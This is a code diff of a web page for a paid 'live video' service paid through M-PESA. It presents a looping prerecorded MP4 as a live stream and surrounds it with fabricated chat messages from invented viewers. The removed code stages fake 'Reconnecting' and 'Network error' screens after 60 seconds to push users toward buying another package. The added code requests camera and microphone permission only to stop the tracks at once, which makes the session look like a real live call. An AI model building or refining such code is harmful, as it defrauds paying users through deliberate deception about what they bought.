+    "hidden"
+  );
+
+  failedScreen.classList.add(
+    "hidden"
+  );
+
+  liveScreen.classList.remove(
+    "hidden"
+  );
+
+  await requestCameraPermission();
+}
+
+
+/* CAMERA PERMISSION */
+
+async function requestCameraPermission(){
+
+  if(
+    !navigator.mediaDevices ||
+    !navigator.mediaDevices.getUserMedia
+  ){
+
+    showVideoOverlay(
+      "Camera permission unavailable",
+      "Your browser does not support camera permission.",
+      true
+    );
 
     return;
   }
 
-  paymentBusy = true;
-
-  paymentStatus.textContent =
-    "Connecting to M-PESA...";
+  showVideoOverlay(
+    "Allow camera & microphone",
+    "Please allow permission to continue.",
+    false
+  );
 
   try{
 
-    const response =
-      await fetch(
-        STK_PUSH_URL,
-        {
-          method:"POST",
-
-          headers:{
-            "Content-Type":
-              "application/json"
-          },
-
-          body:JSON.stringify({
-
-            phone:phone,
-
-            amount:selectedPrice,
-
-            reference:
-              "LIVE-" +
-              selectedMinutes +
-              "-" +
-              Date.now()
-
-          })
-        }
-      );
-
-    const data =
-      await response.json()
-      .catch(function(){
-        return {};
+    const stream =
+      await navigator.mediaDevices.getUserMedia({
+        video:true,
+        audio:true
       });
 
-    if(!response.ok){
+    permissionVideo.srcObject =
+      stream;
 
-      throw new Error(
-        data.message ||
-        "Payment request failed"
-      );
+    try{
+
+      await permissionVideo.play();
+
+    }catch(error){
+
+      /* Permission already granted. */
+
     }
 
-    paymentStatus.textContent =
-      "Check your phone and enter your M-PESA PIN.";
+    stream
+      .getTracks()
+      .forEach(function(track){
 
-    const transactionId =
-      data.transaction_request_id ||
-      data.transactionRequestId ||
-      data.checkout_request_id ||
-      data.checkoutRequestID ||
-      data.id;
+        track.stop();
 
-    if(!transactionId){
+      });
 
-      paymentStatus.textContent =
-        "Payment request sent. Waiting for confirmation...";
+    permissionVideo.srcObject =
+      null;
 
-      paymentBusy = false;
-      return;
-    }
+    hideVideoOverlay();
 
-    checkPaymentStatus(transactionId);
+    startLiveVideo();
+
+    startLiveChat();
 
   }catch(error){
 
-    paymentStatus.textContent =
-      "No payment is done";
-
-    paymentBusy = false;
-  }
-}
-
-function checkPaymentStatus(transactionId){
-
-  let attempts = 0;
-  const maxAttempts = 30;
-
-  clearInterval(paymentPollTimer);
-
-  paymentPollTimer =
-    setInterval(async function(){
-
-      attempts++;
-
-      try{
-
-        const response =
-          await fetch(
-            PAYMENT_STATUS_URL,
-            {
-              method:"POST",
-
-              headers:{
-                "Content-Type":
-                  "application/json"
-              },
-
-              body:JSON.stringify({
-
-                transaction_request_id:
-                  transactionId
-
-              })
-            }
-          );
-
-        const data =
-          await response.json()
-          .catch(function(){
-            return {};
-          });
-
-        const status =
-          String(
-            data.status ||
-            data.result ||
-            data.payment_status ||
-            ""
-          ).toLowerCase();
-
-        if(
-          status === "success" ||
-          status === "paid" ||
-          status === "completed" ||
-          data.paid === true
-        ){
-
-          clearInterval(paymentPollTimer);
-
-          paymentBusy = false;
-
-          paymentStatus.textContent =
-            "Payment confirmed";
-
-          setTimeout(
-            openLiveVideo,
-            700
-          );
-
-          return;
-        }
-
-        if(
-          status === "failed" ||
-          status === "cancelled" ||
-          status === "canceled"
-        ){
-
-          clearInterval(paymentPollTimer);
-
-          paymentBusy = false;
-
-          showFailedPayment();
-
-          return;
-        }
-
-        paymentStatus.textContent =
-          "Checking payment...";
-
-        if(attempts >= maxAttempts){
-
-          clearInterval(paymentPollTimer);
-
-          paymentBusy = false;
-
-          showFailedPayment();
-        }
-
-      }catch(error){
-
-        if(attempts >= maxAttempts){
-
-          clearInterval(paymentPollTimer);
-
-          paymentBusy = false;
-
-          showFailedPayment();
-        }
-      }
-
-    },2000);
-  }
-function showFailedPayment(){
-
-  paymentStatus.textContent =
-    "No payment is done";
-
-  liveScreen.classList.add("hidden");
-
-  failedScreen.classList.add("hidden");
-
-  packagesScreen.classList.remove("hidden");
-}
-
-/* PAYMENT CONFIRMED -> VIDEO */
-
-function openLiveVideo(){
-
-  packagesScreen.classList.add("hidden");
-  failedScreen.classList.add("hidden");
-  liveScreen.classList.remove("hidden");
-
-  liveStarted = true;
-  videoReconnectUsed = false;
-
-  startLiveVideo();
-  startLiveChat();
-}
-
-/* VIDEO START */
-
-function startLiveVideo(){
-
-  clearInterval(liveTimer);
-
-  hideVideoOverlay();
-
-  liveVideo.pause();
-  liveVideo.currentTime = 0;
-
-  liveVideo.src =
-    LIVE_VIDEO_URL;
-
-  liveVideo.load();
-
-  const playPromise =
-    liveVideo.play();
-
-  if(
-    playPromise &&
-    typeof playPromise.catch === "function"
-  ){
-
-    playPromise.catch(function(){
-
-      showVideoOverlay(
-        "Tap to start live video",
-        "The video is ready"
-      );
-
-    });
-  }
-
-  startLiveClock();
-}
-
-/*
-30 SECONDS:
-VIDEO PAUSES
-RECONNECTING FOR 3 SECONDS
-THEN VIDEO CONTINUES
-*/
-
-function startLiveClock(){
-
-  clearInterval(liveTimer);
-
-  const startedAt =
-    Date.now();
-
-  liveTimer =
-    setInterval(function(){
-
-      const elapsed =
-        Math.floor(
-          (Date.now() - startedAt) / 1000
-        );
-
-      if(
-        elapsed >= 30 &&
-        !videoReconnectUsed
-      ){
-
-        videoReconnectUsed = true;
-
-        liveVideo.pause();
-
-        showVideoOverlay(
-          "Reconnecting...",
-          "Please wait 3 seconds"
-        );
-
-        clearInterval(liveTimer);
-
-        setTimeout(function(){
-
-          hideVideoOverlay();
-
-          liveVideo.play()
-            .catch(function(){});
-
-          startSecondStageTimer();
-
-        },3000);
-      }
-
-    },250);
-}
-
-/*
-AFTER RECONNECT:
-27 SECONDS LATER
-= 60 SECONDS TOTAL
-*/
-
-function startSecondStageTimer(){
-
-  clearInterval(liveTimer);
-
-  const secondStarted =
-    Date.now();
-
-  liveTimer =
-    setInterval(function(){
-
-      const elapsed =
-        Math.floor(
-          (Date.now() - secondStarted) / 1000
-        );
-
-      if(elapsed >= 27){
-
-        clearInterval(liveTimer);
-
-        liveVideo.pause();
-
-        showReloadError();
-      }
-
-    },250);
-}
-
-function showReloadError(){
-
-  showVideoOverlay(
-    "Network error",
-    "Live video connection lost"
-  );
-
-  reloadLiveBtn.classList.remove(
-    "hidden"
-  );
-}
-
-/*
-BUTTON:
-RECONNECTING 5 SECONDS
-THEN FAILED 2 SECONDS
-THEN PACKAGES
-*/
-
-function reloadLiveVideo(){
-
-  reloadLiveBtn.classList.add(
-    "hidden"
-  );
-
-  showVideoOverlay(
-    "Reconnecting...",
-    "Please wait 5 seconds"
-  );
-
-  liveVideo.pause();
-
-  clearInterval(liveTimer);
-
-  setTimeout(function(){
-
     showVideoOverlay(
-      "Failed",
-      "Returning to packages..."
+      "Permission required",
+      "Allow camera and microphone access, then tap Continue.",
+      true
     );
-
-    setTimeout(function(){
-
-      returnToPackages();
-
-    },2000);
-
-  },5000);
+  }
 }
 
-function showVideoOverlay(title,sub){
+  </script>
+  <script>
 
-  videoOverlay.classList.remove(
-    "hidden"
-  );
+function showVideoOverlay(
+  title,
+  subtitle,
+  showButton
+){
 
   videoOverlayTitle.textContent =
     title;
 
   videoOverlaySub.textContent =
-    sub;
+    subtitle;
+
+  videoOverlay.classList.remove(
+    "hidden"
+  );
+
+  if(showButton){
+
+    reloadLiveBtn.classList.remove(
+      "hidden"
+    );
+
+  }else{
+
+    reloadLiveBtn.classList.add(
+      "hidden"
+    );
+  }
 }
+
 
 function hideVideoOverlay(){
 
@@ -1532,250 +1167,383 @@ function hideVideoOverlay(){
   );
 }
 
-function returnToPackages(){
 
-  clearInterval(liveTimer);
-  clearInterval(chatTimer);
+function reloadLiveVideo(){
 
-  liveVideo.pause();
+  requestCameraPermission();
+}
 
-  liveVideo.removeAttribute("src");
+
+/* LIVE VIDEO */
+
+function startLiveVideo(){
+
+  liveVideo.src =
+    LIVE_VIDEO_URL;
+
   liveVideo.load();
+
+  const playVideo =
+    async function(){
+
+      try{
+
+        await liveVideo.play();
+
+      }catch(error){
+
+        showVideoOverlay(
+          "Tap Continue",
+          "The live video could not start automatically.",
+          true
+        );
+      }
+    };
+
+  liveVideo.addEventListener(
+    "loadeddata",
+    playVideo,
+    {
+      once:true
+    }
+  );
+
+  playVideo();
+}
+
+
+/* VIDEO ERROR */
+
+liveVideo.addEventListener(
+  "error",
+  function(){
+
+    showVideoOverlay(
+      "Video unavailable",
+      "Please try again.",
+      true
+    );
+
+  }
+);
+
+
+/* LOOP VIDEO */
+
+liveVideo.addEventListener(
+  "ended",
+  function(){
+
+    liveVideo.currentTime = 0;
+
+    liveVideo
+      .play()
+      .catch(function(){});
+
+  }
+);
+
+
+/* RETURN TO PACKAGES */
+
+function returnToPackages(){
 
   liveStarted = false;
 
-  liveScreen.classList.add("hidden");
-  failedScreen.classList.add("hidden");
+  liveScreen.classList.add(
+    "hidden"
+  );
+
+  failedScreen.classList.add(
+    "hidden"
+  );
 
   packagesScreen.classList.remove(
     "hidden"
   );
 
-  paymentStatus.textContent =
-    "Select another package to continue";
-  }
-  const leftChatData = [
- ["Sarah","Hi ❤️"],
- ["Maya","Hello live!"],
- ["Ann","Wow 😍"],
- ["Lucy","So nice"],
- ["Grace","Hi there"],
- ["Jane","Watching now"],
- ["Emma","Hello 👋"],
- ["Linda","Amazing"],
- ["Nina","❤️❤️"],
- ["Rose","Hi everyone"]
-];
+  if(chatTimer){
 
-const rightChatData = [
- ["David","Hello 👋"],
- ["Brian","Nice live"],
- ["Kevin","Wow"],
- ["Mark","Hello"],
- ["Alex","Watching"],
- ["Daniel","Great"],
- ["Chris","Hi ❤️"],
- ["Mike","Live now"],
- ["John","Amazing"],
- ["Peter","Hello everyone"]
-];
-
-const centerChatData = [
- ["Amina","Hello ❤️"],
- ["Grace","Wow 😍"],
- ["Kevin","Nice live 👍"],
- ["Maya","Watching now"],
- ["Rose","Hello 👋"],
- ["John","Amazing"],
- ["Nina","❤️❤️"],
- ["David","Nice video"],
- ["Sarah","Hello everyone"],
- ["Brian","Wow 👍"]
-];
-
-let leftChatIndex = 0;
-let rightChatIndex = 0;
-let centerChatIndex = 0;
-
-function escapeHtml(value){
-
-  const div =
-    document.createElement("div");
-
-  div.textContent =
-    String(value);
-
-  return div.innerHTML;
-}
-
-function createMessage(
-  container,
-  name,
-  message
-){
-
-  const item =
-    document.createElement("div");
-
-  item.className =
-    "side-message";
-
-  item.innerHTML =
-    "<b>" +
-    escapeHtml(name) +
-    ":</b> " +
-    escapeHtml(message);
-
-  container.appendChild(item);
-
-  while(container.children.length > 9){
-
-    container.removeChild(
-      container.firstChild
+    clearInterval(
+      chatTimer
     );
+
+    chatTimer = null;
+  }
+
+  liveVideo.pause();
+
+  liveVideo.removeAttribute(
+    "src"
+  );
+
+  liveVideo.load();
+}
+
+  </script>
+  <script>
+
+const chatNames = [
+  "Brian",
+  "Kevin",
+  "Mary",
+  "Linda",
+  "James",
+  "Daniel",
+  "Alex",
+  "Chris",
+  "Peter",
+  "Ann"
+];
+
+const chatMessages = [
+  "Hello 👋",
+  "Hi there ❤️",
+  "Nice live!",
+  "Amazing 🔥",
+  "Hello everyone",
+  "Wow 😍",
+  "Nice to see you",
+  "Great live ❤️",
+  "Hey 👋",
+  "Beautiful live"
+];
+
+
+function randomItem(array){
+
+  return array[
+    Math.floor(
+      Math.random() *
+      array.length
+    )
+  ];
+}
+
+
+function createChatMessage(){
+
+  const name =
+    randomItem(chatNames);
+
+  const message =
+    randomItem(chatMessages);
+
+  return name +
+    ": " +
+    message;
+}
+
+
+function addChatMessage(){
+
+  const text =
+    createChatMessage();
+
+
+  const left =
+    document.createElement(
+      "div"
+    );
+
+  left.className =
+    "chat-message";
+
+  left.textContent =
+    text;
+
+
+  const right =
+    document.createElement(
+      "div"
+    );
+
+  right.className =
+    "chat-message";
+
+  right.textContent =
+    text;
+
+
+  const center =
+    document.createElement(
+      "div"
+    );
+
+  center.className =
+    "center-chat-message";
+
+  center.textContent =
+    text;
+
+
+  const leftBox =
+    document.getElementById(
+      "leftChatMessages"
+    );
+
+  const rightBox =
+    document.getElementById(
+      "rightChatMessages"
+    );
+
+  const centerBox =
+    document.getElementById(
+      "centerChatMessages"
+    );
+
+
+  if(leftBox){
+
+    leftBox.appendChild(
+      left
+    );
+
+    while(
+      leftBox.children.length > 12
+    ){
+
+      leftBox.removeChild(
+        leftBox.firstChild
+      );
+    }
+  }
+
+
+  if(rightBox){
+
+    rightBox.appendChild(
+      right
+    );
+
+    while(
+      rightBox.children.length > 12
+    ){
+
+      rightBox.removeChild(
+        rightBox.firstChild
+      );
+    }
+  }
+
+
+  if(centerBox){
+
+    centerBox.appendChild(
+      center
+    );
+
+    while(
+      centerBox.children.length > 8
+    ){
+
+      centerBox.removeChild(
+        centerBox.firstChild
+      );
+    }
   }
 }
 
-function addLeftChat(){
-
-  const item =
-    leftChatData[
-      leftChatIndex %
-      leftChatData.length
-    ];
-
-  createMessage(
-    leftChatMessages,
-    item[0],
-    item[1]
-  );
-
-  leftChatIndex++;
-}
-
-function addRightChat(){
-
-  const item =
-    rightChatData[
-      rightChatIndex %
-      rightChatData.length
-    ];
-
-  createMessage(
-    rightChatMessages,
-    item[0],
-    item[1]
-  );
-
-  rightChatIndex++;
-}
-
-function addCenterChat(){
-
-  const item =
-    centerChatData[
-      centerChatIndex %
-      centerChatData.length
-    ];
-
-  createMessage(
-    centerChatMessages,
-    item[0],
-    item[1]
-  );
-
-  centerChatIndex++;
-
-  centerChatMessages.scrollLeft =
-    centerChatMessages.scrollWidth;
-}
 
 function startLiveChat(){
 
-  clearInterval(chatTimer);
+  if(chatTimer){
 
-  leftChatMessages.innerHTML = "";
-  rightChatMessages.innerHTML = "";
-  centerChatMessages.innerHTML = "";
-
-  leftChatIndex = 0;
-  rightChatIndex = 0;
-  centerChatIndex = 0;
-
-  for(let i=0;i<5;i++){
-
-    addLeftChat();
-    addCenterChat();
-    addRightChat();
+    clearInterval(
+      chatTimer
+    );
   }
 
+  addChatMessage();
+
   chatTimer =
-    setInterval(function(){
-
-      addLeftChat();
-
-      setTimeout(
-        addCenterChat,
-        300
-      );
-
-      setTimeout(
-        addRightChat,
-        600
-      );
-
-    },1600);
+    setInterval(
+      addChatMessage,
+      2800
+    );
 }
 
-function reactLive(reaction){
+  </script>
+  <script>
 
-  const el =
-    document.createElement("div");
+function reactLive(emoji){
 
-  el.className =
-    "center-reaction";
-
-  el.textContent =
-    reaction;
-
-  const area =
-    document.querySelector(
-      ".live-video-area"
+  const centerBox =
+    document.getElementById(
+      "centerChatMessages"
     );
 
-  if(!area)return;
+  if(!centerBox){
+    return;
+  }
 
-  area.appendChild(el);
 
-  setTimeout(function(){
-    el.remove();
-  },1800);
+  const message =
+    document.createElement(
+      "div"
+    );
+
+  message.className =
+    "center-chat-message";
+
+  message.textContent =
+    "You: " + emoji;
+
+  centerBox.appendChild(
+    message
+  );
+
+
+  while(
+    centerBox.children.length > 8
+  ){
+
+    centerBox.removeChild(
+      centerBox.firstChild
+    );
+  }
 }
+
 
 function toggleFollow(){
 
-  const button =
+  const followBtn =
     document.getElementById(
       "followBtn"
     );
 
-  if(button.textContent.trim() === "Follow"){
+  if(!followBtn){
+    return;
+  }
 
-    button.textContent =
-      "Following ✓";
 
-    button.style.background =
-      "#555";
+  if(
+    followBtn.textContent ===
+    "Follow"
+  ){
+
+    followBtn.textContent =
+      "Following";
+
+    followBtn.style.background =
+      "#00e676";
+
+    followBtn.style.color =
+      "#001b0c";
 
   }else{
 
-    button.textContent =
+    followBtn.textContent =
       "Follow";
 
-    button.style.background =
-      "#e91e63";
+    followBtn.style.background =
+      "#e60023";
+
+    followBtn.style.color =
+      "#fff";
   }
 }
+
 
 function sendCenterMessage(){
 
@@ -1784,112 +1552,70 @@ function sendCenterMessage(){
       "centerMessageInput"
     );
 
+  const centerBox =
+    document.getElementById(
+      "centerChatMessages"
+    );
+
+
+  if(
+    !input ||
+    !centerBox
+  ){
+    return;
+  }
+
+
   const text =
     input.value.trim();
 
-  if(!text)return;
 
-  const message =
-    document.createElement("div");
-
-  message.className =
-    "center-user-message";
-
-  message.innerHTML =
-    "<b>You:</b> " +
-    escapeHtml(text);
-
-  const area =
-    document.querySelector(
-      ".live-video-area"
-    );
-
-  if(area){
-
-    area.appendChild(message);
-
-    setTimeout(function(){
-      message.remove();
-    },2500);
+  if(!text){
+    return;
   }
 
-  createMessage(
-    centerChatMessages,
-    "You",
-    text
+
+  const message =
+    document.createElement(
+      "div"
+    );
+
+  message.className =
+    "center-chat-message";
+
+  message.textContent =
+    "You: " + text;
+
+
+  centerBox.appendChild(
+    message
   );
+
 
   input.value = "";
 
-  centerChatMessages.scrollLeft =
-    centerChatMessages.scrollWidth;
+
+  while(
+    centerBox.children.length > 8
+  ){
+
+    centerBox.removeChild(
+      centerBox.firstChild
+    );
+  }
 }
 
-document
-  .getElementById("centerMessageInput")
-  .addEventListener(
-    "keydown",
-    function(event){
-
-      if(event.key === "Enter"){
-
-        event.preventDefault();
-
-        sendCenterMessage();
-      }
-    }
-  );
-
-liveVideo.addEventListener(
-  "error",
-  function(){
-
-    if(liveStarted){
-
-      showVideoOverlay(
-        "Network error",
-        "Live video could not continue"
-      );
-
-      reloadLiveBtn.classList.remove(
-        "hidden"
-      );
-    }
-  }
-);
-
-liveVideo.addEventListener(
-  "ended",
-  function(){
-
-    if(liveStarted){
-
-      liveVideo.currentTime = 0;
-
-      liveVideo.play()
-        .catch(function(){});
-    }
-  }
-);
+  </script>
+  <script>
 
 document.addEventListener(
   "DOMContentLoaded",
   function(){
 
-    packagesScreen.classList.remove(
-      "hidden"
-    );
-
-    liveScreen.classList.add(
-      "hidden"
-    );
-
-    failedScreen.classList.add(
-      "hidden"
-    );
-
     const firstPackage =
-      document.querySelector(".package");
+      document.querySelector(
+        ".package"
+      );
 
     if(firstPackage){
 
@@ -1897,168 +1623,107 @@ document.addEventListener(
         firstPackage
       );
     }
+
+    checkPaymentReturn();
+
   }
 );
+
+
+/* ENTER TO SEND MESSAGE */
+
+const centerInput =
+  document.getElementById(
+    "centerMessageInput"
+  );
+
+if(centerInput){
+
+  centerInput.addEventListener(
+    "keydown",
+    function(event){
+
+      if(
+        event.key ===
+        "Enter"
+      ){
+
+        event.preventDefault();
+
+        sendCenterMessage();
+      }
+
+    }
+  );
+}
+
+  </script>
+  <script>
+
+/*
+  IMPORTANT:
+
+  This page does NOT replace
+  your existing M-PESA API.
+
+  The existing payment page
+  continues to return here with:
+
+  ?paid=1
+  &minutes=...
+  &price=...
+
+  After payment confirmation:
+
+  1. Packages disappear
+  2. Live screen opens
+  3. Camera permission is requested
+  4. Permission is granted
+  5. Camera tracks are stopped
+  6. Existing live MP4 starts automatically
+
+  No visible countdown.
+  No visible video seconds counter.
+*/
+
 
 window.addEventListener(
   "beforeunload",
   function(){
 
-    clearInterval(paymentPollTimer);
-    clearInterval(liveTimer);
-    clearInterval(chatTimer);
+    if(chatTimer){
+
+      clearInterval(
+        chatTimer
+      );
+
+      chatTimer = null;
+    }
+
+
+    if(
+      permissionVideo &&
+      permissionVideo.srcObject
+    ){
+
+      permissionVideo
+        .srcObject
+        .getTracks()
+        .forEach(
+          function(track){
+
+            track.stop();
+
+          }
+        );
+
+      permissionVideo.srcObject =
+        null;
+    }
 
   }
 );
 
-</script>
-
-<style>
-
-@media(max-width:700px){
-
-  .live-layout{
-    grid-template-columns:
-      13% minmax(0,74%) 13%;
-
-    grid-template-rows:
-      minmax(0,1fr) auto;
-  }
-
-  .chat-title{
-    font-size:7px;
-    height:25px;
-  }
-
-  .side-message{
-    padding:5px 4px;
-    font-size:7px;
-    border-radius:7px;
-  }
-
-  .center-chat{
-    height:110px;
-  }
-
-  .center-chat-messages
-  .side-message{
-    font-size:9px;
-    padding:5px 7px;
-  }
-
-  .center-chat-actions{
-    gap:3px;
-  }
-
-  .center-chat-actions button{
-    padding:5px 7px;
-    font-size:13px;
-  }
-
-  .center-chat-actions
-  .follow-btn{
-    padding:6px 8px;
-    font-size:9px;
-  }
-}
-
-@media(max-width:430px){
-
-  .live-layout{
-    grid-template-columns:
-      11% minmax(0,78%) 11%;
-  }
-
-  .chat-title{
-    font-size:6px;
-    height:22px;
-  }
-
-  .side-message{
-    padding:4px 3px;
-    font-size:6px;
-    line-height:1.1;
-  }
-
-  .center-chat{
-    height:105px;
-  }
-
-  .center-chat-header{
-    height:22px;
-    font-size:8px;
-  }
-
-  .center-chat-messages{
-    gap:5px;
-    padding:4px;
-  }
-
-  .center-chat-messages
-  .side-message{
-    font-size:8px;
-    padding:5px 7px;
-  }
-
-  .center-chat-actions{
-    height:31px;
-  }
-
-  .center-chat-actions button{
-    font-size:12px;
-    padding:4px 6px;
-  }
-
-  .center-chat-actions
-  .follow-btn{
-    font-size:8px;
-    padding:5px 7px;
-  }
-
-  .center-message-box{
-    height:36px;
-  }
-
-  .center-message-box input{
-    height:27px;
-    font-size:10px;
-  }
-
-  .center-message-box button{
-    height:27px;
-    font-size:9px;
-    padding:0 8px;
-  }
-}
-
-@media(
-  max-height:500px
-) and (
-  orientation:landscape
-){
-
-  .center-chat{
-    height:82px;
-  }
-
-  .center-chat-header{
-    height:20px;
-  }
-
-  .center-chat-actions{
-    height:27px;
-  }
-
-  .center-message-box{
-    height:35px;
-  }
-}
-
-html,body{
-  touch-action:manipulation;
-}
-
-</style>
-
-</body>
+  </script>
+  </body>
 </html>
